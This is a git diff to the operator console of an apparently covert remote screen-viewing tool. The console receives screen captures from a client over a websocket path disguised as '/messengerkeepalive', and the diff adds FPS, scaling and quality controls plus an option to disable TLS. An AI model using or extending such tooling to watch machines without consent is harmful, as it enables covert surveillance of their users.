@@ -23,11 +23,15 @@ var banner = `
 █▀█ █▀▀ █ █▄░█ █▀ █▀▀ █░█ ▄▀█ █░█ █▀▀ █▀█
 █▀▄ ██▄ █ █░▀█ ▄█ █▄▄ █▀█ █▀█ █▄█ ██▄ █▀▄`
 
-var DEFAULT_FPS = 10
+var DEFAULT_FPS = 1
+var DEFAULT_SCALER = 2
+var DEFAULT_QUALITY = 20
+
 var addr = flag.String("addr", "0.0.0.0:6969", "Listener")
 var context = flag.String("context", "/messengerkeepalive", "Context Path (has to match with client)")
 var server_key = flag.String("srvkey", "server.key", "Server Key")
 var server_crt = flag.String("srvcrt", "server.crt", "Server Certificate")
+var no_tls = flag.Bool("noTLS", false, "Don't use TLS")
 var WINDOW fyne.Window
 var derButton = newHackerButton(widget.NewButton("yolo", func() {}))
 var upgrader = websocket.Upgrader{} // use default options
@@ -36,12 +40,27 @@ var CONN *websocket.Conn
 // for absolute positioning in windows
 var CONV_BASE = float32(65535)
 var IMG = canvas.NewImageFromFile("reinschauer.jpg")
-var slider = &widget.Slider{Step: 1, Min: 1, Max: 30, OnChanged: func(f float64) {
+var fps_slider = &widget.Slider{Step: 1, Min: 1, Max: 30, OnChanged: func(f float64) {
 	if CONN == nil {
 		return
 	}
 	CONN.WriteMessage(websocket.TextMessage, []byte("FPS "+strconv.Itoa(int(f))))
 }}
+
+var scaler_slider = &widget.Slider{Step: 1, Min: 1, Max: 10, OnChanged: func(f float64) {
+	if CONN == nil {
+		return
+	}
+	CONN.WriteMessage(websocket.TextMessage, []byte("SCL "+strconv.Itoa(int(f))))
+}}
+
+var quality_slider = &widget.Slider{Step: 10, Min: 1, Max: 100, OnChanged: func(f float64) {
+	if CONN == nil {
+		return
+	}
+	CONN.WriteMessage(websocket.TextMessage, []byte("QUL "+strconv.Itoa(int(f))))
+}}
+
 var shiftHeld = false
 
 func handler(w http.ResponseWriter, r *http.Request) {
@@ -54,16 +73,34 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	defer CONN.Close()
 
 	box := container.NewPadded(IMG, derButton)
-	slider_layout := container.NewHSplit(widget.NewLabel("FPS"), slider)
-	slider_layout.SetOffset(0)
-	split := container.NewVSplit(box, slider_layout)
+
+	fps_slider_layout := container.NewHSplit(widget.NewLabel("FPS"), fps_slider)
+	fps_slider_layout.SetOffset(0)
+
+	scaler_slider_layout := container.NewHSplit(widget.NewLabel("Scaler"), scaler_slider)
+	scaler_slider_layout.SetOffset(0)
+
+	quality_slider_layout := container.NewHSplit(widget.NewLabel("Quality"), quality_slider)
+	quality_slider_layout.SetOffset(0)
+
+	settingsBox := container.NewVBox(fps_slider_layout, scaler_slider_layout, quality_slider_layout)
+
+	split := container.NewVSplit(box, settingsBox)
 	split.SetOffset(1)
 	WINDOW.SetContent(split)
 
-	// set default FPS
+	// set default values
 	fps_str := strconv.Itoa(DEFAULT_FPS)
 	CONN.WriteMessage(websocket.TextMessage, []byte("FPS "+fps_str))
-	slider.SetValue(float64(DEFAULT_FPS))
+	fps_slider.SetValue(float64(DEFAULT_FPS))
+
+	scaler_str := strconv.Itoa(DEFAULT_SCALER)
+	CONN.WriteMessage(websocket.TextMessage, []byte("SCL "+scaler_str))
+	scaler_slider.SetValue(float64(DEFAULT_SCALER))
+
+	quality_str := strconv.Itoa(DEFAULT_QUALITY)
+	CONN.WriteMessage(websocket.TextMessage, []byte("QUL "+quality_str))
+	quality_slider.SetValue(float64(DEFAULT_QUALITY))
 
 	for {
 		messageType, message, err := CONN.ReadMessage()
@@ -73,8 +110,8 @@ func handler(w http.ResponseWriter, r *http.Request) {
 			continue
 		}
 
+		// image payload
 		if messageType == websocket.BinaryMessage {
-			// image payload
 			jpgReader := bytes.NewReader(message)
 			IMG = canvas.NewImageFromReader(jpgReader, "")
 			IMG.FillMode = canvas.ImageFillStretch
@@ -97,8 +134,13 @@ func startServer() error {
 	log.SetFlags(0)
 
 	http.HandleFunc(*context, handler)
-	//return http.ListenAndServeTLS(*addr, nil)
-	return http.ListenAndServeTLS(*addr, *server_crt, *server_key, nil)
+	if *no_tls {
+		fmt.Println("Not Using TLS")
+		return http.ListenAndServe(*addr, nil)
+	} else {
+		fmt.Println("Using TLS")
+		return http.ListenAndServeTLS(*addr, *server_crt, *server_key, nil)
+	}
 }
 
 // a button with the Tappable interface implemented
